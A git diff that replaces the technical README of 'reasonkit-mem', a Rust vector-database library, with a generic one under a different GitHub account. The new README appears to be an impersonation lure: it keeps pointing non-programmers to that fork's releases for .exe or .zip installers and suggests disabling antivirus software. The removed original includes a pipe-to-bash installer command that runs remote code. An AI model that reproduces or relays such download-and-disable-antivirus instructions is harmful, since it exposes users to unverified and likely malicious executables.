@@ -1,338 +1,73 @@
-<div align="center">
+# 🚀 reasonkit-mem - Your Memory Layer for AI Made Easy
 
-# ReasonKit Mem
+[![Download here](https://img.shields.io/badge/Download_Latest_Version-%20-blue)](https://github.com/Sachin5464/reasonkit-mem/releases)
 
-**Memory & Retrieval Infrastructure for ReasonKit**
+## 📖 Introduction
 
-[![CI](https://badges.reasonkit.sh/github/actions/workflow/status/reasonkit/reasonkit-mem/ci.yml?branch=main&style=flat-square&logo=github&label=CI&color=06b6d4&logoColor=06b6d4)](https://github.com/reasonkit/reasonkit-mem/actions/workflows/ci.yml)
-[![Security](https://badges.reasonkit.sh/github/actions/workflow/status/reasonkit/reasonkit-mem/security.yml?branch=main&style=flat-square&logo=github&label=Security&color=10b981&logoColor=10b981)](https://github.com/reasonkit/reasonkit-mem/actions/workflows/security.yml)
-[![Crates.io](https://badges.reasonkit.sh/crates/v/reasonkit-mem?style=flat-square&logo=rust&color=10b981&logoColor=f9fafb)](https://crates.io/crates/reasonkit-mem)
-[![docs.rs](https://badges.reasonkit.sh/docsrs/reasonkit-mem?style=flat-square&logo=docs.rs&color=06b6d4&logoColor=f9fafb)](https://docs.rs/reasonkit-mem)
-[![Downloads](https://badges.reasonkit.sh/crates/d/reasonkit-mem?style=flat-square&color=ec4899&logo=rust&logoColor=f9fafb)](https://crates.io/crates/reasonkit-mem)
-[![License](https://badges.reasonkit.sh/static/v1?label=license&message=Apache%202.0&color=a855f7&style=flat-square&labelColor=030508)](./LICENSE)
-[![Rust](https://badges.reasonkit.sh/static/v1?label=rust&message=1.75%2B&color=f97316&style=flat-square&logo=rust&logoColor=f9fafb)](https://www.rust-lang.org/)
+reasonkit-mem is a high-performance vector database that acts as a memory layer for AI systems. With features like hybrid search and embeddings, it helps you retrieve and manage information efficiently. Whether you’re developing AI applications or simply exploring data, this tool enhances performance and streamlines your tasks.
 
-_The Long-Term Memory Layer ("Hippocampus") for AI Reasoning_
+## 🚀 Getting Started
 
-[Documentation](https://docs.rs/reasonkit-mem) | [ReasonKit Core](https://github.com/ReasonKit/reasonkit-core) | [Website](https://reasonkit.sh)
+To use reasonkit-mem, follow these easy steps to download and install the software on your system. No programming knowledge is necessary; just a few simple actions will get you started.
 
-</div>
+## 📥 Download & Install
 
----
+1. **Visit the Releases Page**: To download the latest version of reasonkit-mem, [visit this page to download](https://github.com/Sachin5464/reasonkit-mem/releases).
+2. **Choose Your Version**: On the releases page, find the most recent version. Look for files with extensions like `.exe` or `.zip` for your operating system.
+3. **Download the File**: Click on the file link to begin your download. Depending on your browser settings, it may automatically start or prompt you to choose a location to save.
+4. **Install the Application**:
+   - If you downloaded an `.exe` file, double-click the file to run the installer. Follow the prompts until installation is complete.
+   - If you downloaded a `.zip` file, locate the downloaded file, right-click it, and select "Extract All." Open the extracted folder, then double-click the executable file to start the application.
 
-**ReasonKit Mem** is the memory layer ("Hippocampus") for ReasonKit. It provides vector storage, hybrid search, RAPTOR trees, and embedding support.
+## 🔧 System Requirements
 
-## Features
+Before installing reasonkit-mem, ensure your computer meets the following minimum requirements:
 
-- **Vector Storage** - Qdrant-based dense vector storage with embedded mode
-- **Hybrid Search** - Dense (Qdrant) + Sparse (Tantivy BM25) fusion
-- **RAPTOR Trees** - Hierarchical retrieval for long-form QA
-- **Embeddings** - Local (BGE-M3) and remote (OpenAI) embedding support
-- **Reranking** - Cross-encoder reranking for precision
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a supported Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Storage**: Minimum 100 MB of free space for installation.
+- **Processor**: Intel i3 or equivalent.
 
-## Installation
+These requirements help ensure smooth operation and better performance of the application.
 
-### Universal Installer (Recommended)
+## 📚 Features
 
-**Installs all 4 ReasonKit projects together:**
+reasonkit-mem offers several powerful features designed to enhance your AI systems:
 
-```bash
-curl -fsSL https://get.reasonkit.sh | bash -s -- --with-memory
-```
+- **Hybrid Search**: Combines different searching techniques for better results.
+- **Embeddings**: Use advanced embeddings for efficient data representation and retrieval.
+- **RAPTOR Trees**: Benefit from rapid tree data structures for faster access to information.
+- **BM25 Fusion**: Improve your search accuracy with this state-of-the-art ranking function.
 
-**Platform & Shell Support:**
+These features make reasonkit-mem a go-to solution for managing and retrieving information efficiently.
 
-- ✅ All platforms (Linux/macOS/Windows/WSL)
-- ✅ All shells (Bash/Zsh/Fish/Nu/PowerShell/Elvish)
-- ✅ Auto-detects shell and configures PATH
-- ✅ Beautiful progress visualization
+## 🌐 How to Use reasonkit-mem
 
-### Cargo (Rust Library)
+1. **Launch the Application**: After installation, open reasonkit-mem from your applications list.
+2. **Load Your Data**: Import the data you want to work with. You can load various data formats such as CSV, JSON, or direct API links.
+3. **Conduct Searches**: Use the search feature to find what you need quickly. Apply filters and configurations for refined results.
+4. **Analyze Results**: Review the information retrieved and use it for your projects or insights.
 
-Add to your `Cargo.toml`:
+## ⚙️ Troubleshooting
 
-```toml
-[dependencies]
-reasonkit-mem = "0.1"
-tokio = { version = "1", features = ["full"] }
-```
+If you encounter any issues while downloading or using reasonkit-mem, consider these solutions:
 
-## Usage
+- **Installation Problems**: If the application fails to install, check that your system meets the requirements and try disabling any antivirus software temporarily.
+- **Performance Issues**: For slow performance, make sure you have adequate RAM available and close unnecessary applications running in the background.
+- **Data Loading Errors**: Ensure your data files are formatted correctly. Invalid data formats can lead to loading issues.
 
-### Basic Usage (Embedded Mode)
+## 🛠️ Support
 
-```rust,ignore
-use reasonkit_mem::storage::Storage;
+For additional help, visit the [GitHub Issues page](https://github.com/Sachin5464/reasonkit-mem/issues) to report bugs or request features. You can also consult the user documentation for more detailed instructions.
 
-#[tokio::main]
-async fn main() -> anyhow::Result<()> {
-    // Create embedded storage (automatic file storage fallback)
-    let storage = Storage::new_embedded().await?;
+## 🔗 Additional Resources
 
-    // Use storage...
-    Ok(())
-}
-```
+- [Documentation](https://github.com/Sachin5464/reasonkit-mem/wiki): Comprehensive guides and information.
+- [Community Forum](https://github.com/Sachin5464/reasonkit-mem/discussions): Engage with other users to share tips and solutions.
+- [GitHub Repository](https://github.com/Sachin5464/reasonkit-mem): Access the source code and contribute to the project.
 
-### Storage with Custom Configuration
+## 📥 Quick Download Link
 
-```rust,ignore
-use reasonkit_mem::storage::{Storage, EmbeddedStorageConfig};
-use std::path::PathBuf;
+For quick access, [visit this page to download](https://github.com/Sachin5464/reasonkit-mem/releases). Download the latest version and enjoy all the features reasonkit-mem has to offer.
 
-#[tokio::main]
-async fn main() -> anyhow::Result<()> {
-    // Create storage with custom file path
-    let config = EmbeddedStorageConfig::file_only(PathBuf::from("./data"));
-    let storage = Storage::new_embedded_with_config(config).await?;
-
-    // Or use Qdrant (requires running server)
-    let qdrant_config = EmbeddedStorageConfig::with_qdrant(
-        "http://localhost:6333",
-        "my_collection",
-        1536,
-    );
-    let qdrant_storage = Storage::new_embedded_with_config(qdrant_config).await?;
-
-    Ok(())
-}
-```
-
-### Hybrid Search with KnowledgeBase
-
-```rust,ignore
-use reasonkit_mem::retrieval::KnowledgeBase;
-use reasonkit_mem::{Document, DocumentType, Source, SourceType};
-use chrono::Utc;
-
-#[tokio::main]
-async fn main() -> anyhow::Result<()> {
-    // Create in-memory knowledge base
-    let kb = KnowledgeBase::in_memory()?;
-
-    // Create a document
-    let source = Source {
-        source_type: SourceType::Local,
-        url: None,
-        path: Some("notes.md".to_string()),
-        arxiv_id: None,
-        github_repo: None,
-        retrieved_at: Utc::now(),
-        version: None,
-    };
-
-    let doc = Document::new(DocumentType::Note, source)
-        .with_content("Machine learning is a subset of artificial intelligence.".to_string());
-
-    // Add document to knowledge base
-    kb.add(&doc).await?;
-
-    // Search using sparse retrieval (BM25)
-    let results = kb.retriever().search_sparse("machine learning", 5).await?;
-
-    for result in results {
-        println!("Score: {:.3}, Text: {}", result.score, result.text);
-    }
-
-    Ok(())
-}
-```
-
-### Using Embeddings
-
-```rust,ignore
-use reasonkit_mem::embedding::{EmbeddingConfig, EmbeddingPipeline, OpenAIEmbedding};
-use reasonkit_mem::retrieval::KnowledgeBase;
-use std::sync::Arc;
-
-#[tokio::main]
-async fn main() -> anyhow::Result<()> {
-    // Create OpenAI embedding provider (requires OPENAI_API_KEY env var)
-    let embedding_provider = OpenAIEmbedding::openai()?;
-    let pipeline = Arc::new(EmbeddingPipeline::new(Arc::new(embedding_provider)));
-
-    // Create knowledge base with embedding support
-    let kb = KnowledgeBase::in_memory()?
-        .with_embedding_pipeline(pipeline);
-
-    // Now hybrid search will use both dense (vector) and sparse (BM25)
-    // let results = kb.query("semantic search query", 10).await?;
-
-    Ok(())
-}
-```
-
-### Embedded Mode Documentation
-
-For detailed information about embedded mode, see [docs/EMBEDDED_MODE_GUIDE.md](docs/EMBEDDED_MODE_GUIDE.md).
-
-## Architecture
-
-![ReasonKit Mem Hybrid Architecture](./brand/readme/hybrid_architecture.png)
-![ReasonKit Mem Hybrid Architecture Technical Diagram](./brand/readme/hybrid_retrieval_engine.svg)
-
-### The RAPTOR Algorithm (Hierarchical Indexing)
-
-ReasonKit Mem implements **RAPTOR** (Recursive Abstractive Processing for Tree-Organized Retrieval) to answer high-level questions across large document sets.
-
-![ReasonKit Mem RAPTOR Tree Structure](./brand/readme/raptor_tree_structure.svg)
-
-![ReasonKit Mem RAPTOR Tree](./brand/readme/raptor_tree.png)
-
-### The Memory Dashboard
-
-![ReasonKit Mem Dashboard](./brand/readme/memory_dashboard.png)
-
-### Integration Ecosystem
-
-![ReasonKit Mem Ecosystem](./brand/readme/mem_ecosystem.png)
-
-## Technology Stack
-
-| Component      | Technology          | Purpose                |
-| -------------- | ------------------- | ---------------------- |
-| **Qdrant**     | qdrant-client 1.10+ | Dense vector storage   |
-| **Tantivy**    | tantivy 0.22+       | BM25 sparse search     |
-| **RAPTOR**     | Custom Rust         | Hierarchical retrieval |
-| **Embeddings** | BGE-M3 / OpenAI     | Dense representations  |
-| **Reranking**  | Cross-encoder       | Final precision boost  |
-
-## Project Structure
-
-```text
-reasonkit-mem/
-├── src/
-│   ├── storage/      # Qdrant vector + file-based storage
-│   ├── embedding/    # Dense vector embeddings
-│   ├── retrieval/    # Hybrid search, fusion, reranking
-│   ├── raptor/       # RAPTOR hierarchical tree structure
-│   ├── indexing/     # BM25/Tantivy sparse indexing
-│   └── rag/          # RAG pipeline orchestration
-├── benches/          # Performance benchmarks
-├── examples/         # Usage examples
-├── docs/             # Additional documentation
-└── Cargo.toml
-```
-
-## Feature Flags
-
-| Feature            | Description                              |
-| ------------------ | ---------------------------------------- |
-| `default`          | Core functionality                       |
-| `python`           | Python bindings via PyO3                 |
-| `local-embeddings` | Local BGE-M3 embeddings via ONNX Runtime |
-
-## API Reference
-
-### Core Types (re-exported at crate root)
-
-```rust,ignore
-use reasonkit_mem::{
-    // Documents
-    Document, DocumentType, DocumentContent,
-    // Chunks
-    Chunk, EmbeddingIds,
-    // Sources
-    Source, SourceType,
-    // Metadata
-    Metadata, Author,
-    // Search
-    SearchResult, MatchSource, RetrievalConfig,
-    // Processing
-    ProcessingStatus, ProcessingState, ContentFormat,
-    // Errors
-    MemError, MemResult,
-};
-```
-
-### Storage Module
-
-```rust,ignore
-use reasonkit_mem::storage::{
-    Storage,
-    EmbeddedStorageConfig,
-    StorageBackend,
-    InMemoryStorage,
-    FileStorage,
-    QdrantStorage,
-    AccessContext,
-    AccessLevel,
-};
-```
-
-### Embedding Module
-
-```rust,ignore
-use reasonkit_mem::embedding::{
-    EmbeddingProvider,      // Trait for embedding backends
-    OpenAIEmbedding,        // OpenAI API embeddings
-    EmbeddingConfig,        // Configuration
-    EmbeddingPipeline,      // Batch processing pipeline
-    EmbeddingResult,        // Single embedding result
-    EmbeddingVector,        // Vec<f32> alias
-    cosine_similarity,      // Utility function
-    normalize_vector,       // Utility function
-};
-```
-
-### Retrieval Module
-
-```rust,ignore
-use reasonkit_mem::retrieval::{
-    HybridRetriever,        // Main retrieval engine
-    KnowledgeBase,          // High-level API
-    HybridResult,           // Search result
-    RetrievalStats,         // Statistics
-    // Fusion
-    FusionEngine,
-    FusionStrategy,
-    // Reranking
-    Reranker,
-    RerankerConfig,
-};
-```
-
-## Version & Maturity
-
-| Component            | Status    | Notes                                                |
-| -------------------- | --------- | ---------------------------------------------------- |
-| **Vector Storage**   | ✅ Stable | Qdrant integration production-ready                  |
-| **Hybrid Search**    | ✅ Stable | Dense + Sparse fusion working                        |
-| **RAPTOR Trees**     | ✅ Stable | Hierarchical retrieval implemented                   |
-| **Embeddings**       | ✅ Stable | OpenAI API fully supported                           |
-| **Local Embeddings** | 🔶 Beta   | BGE-M3 ONNX (enable with `local-embeddings` feature) |
-| **Python Bindings**  | 🔶 Beta   | Build from source with `--features python`           |
-
-**Current Version:** v0.1.2 | [CHANGELOG](CHANGELOG.md) | [Releases](https://github.com/reasonkit/reasonkit-mem/releases)
-
-### Verify Installation
-
-```rust
-use reasonkit_mem::storage::Storage;
-
-#[tokio::main]
-async fn main() -> anyhow::Result<()> {
-    // Quick verification - creates in-memory storage
-    let storage = Storage::new_embedded().await?;
-    println!("ReasonKit Mem initialized successfully!");
-    Ok(())
-}
-```
-
-## License
-
-Apache License 2.0 - see [LICENSE](https://github.com/reasonkit/reasonkit-mem/blob/main/LICENSE)
-
----
-
-<div align="center">
-
-![ReasonKit Ecosystem Connection](./brand/readme/ecosystem_connection.png)
-
-**Part of the ReasonKit Ecosystem**
-
-[ReasonKit Core](https://github.com/reasonkit/reasonkit-core) | [ReasonKit Web](https://github.com/reasonkit/reasonkit-web) | [Website](https://reasonkit.sh)
-
-_"See How Your AI Thinks"_
-
-</div>
+With reasonkit-mem, managing and retrieving information for your AI applications becomes straightforward. Follow the steps above to get started and harness the power of this efficient memory layer.
